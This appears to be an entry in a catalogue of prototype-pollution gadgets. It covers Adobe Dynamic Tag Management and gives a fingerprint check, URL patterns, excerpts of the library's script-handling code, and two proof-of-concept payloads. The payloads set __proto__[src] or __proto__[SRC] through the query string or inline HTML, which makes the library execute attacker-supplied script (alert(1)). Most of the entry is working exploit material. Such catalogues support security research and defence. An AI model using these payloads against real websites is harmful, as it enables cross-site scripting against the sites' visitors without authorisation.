## Adobe Dynamic Tag Management

URL: https://docs.adobe.com/content/help/en/dtm/using/c-overview.html

### JS Fingerprint
```
return (typeof _satellite !== 'undefined')
```

### Vulnerable code fragment
```
https://assets.adobedtm.com/[a-f0-9]+/[a-f0-9]+/launch-[a-f0-9]+.min.js
https://assets.adobedtm.com/launch-EN[a-f0-9]+.min.js
```

```js
r.prototype._handleScriptToken = function u(e) {
    var t = this, n = this.parser.clear();
    n && this.writeQueue.unshift(n),
    e.src = e.attrs.src || e.attrs.SRC,
...

a.prototype._writeScriptToken = function f(e, n) {
    var t = this._buildScript(e)
    , a = this._shouldRelease(t)
    , i = this.options.afterAsync;
    e.src && (t.src = e.src,
```

### PoC

#### PoC #1
```
?__proto__[src]=data:,alert(1)//
```

```html
<script>
  Object.prototype.src='data:,alert(1)//'
</script>
<script src="https://assets.adobedtm.com/launch-ENa21cfed3f06f4ddf9690de8077b39e81-development.min.js" async></script>
```


#### PoC #2
```
?__proto__[SRC]=<img/src/onerror%3dalert(1)>
```

```html
<script>
  Object.prototype.SRC='<img/src/onerror=alert(1)>'
</script>
<script src="https://assets.adobedtm.com/launch-ENa21cfed3f06f4ddf9690de8077b39e81-development.min.js" async></script>
```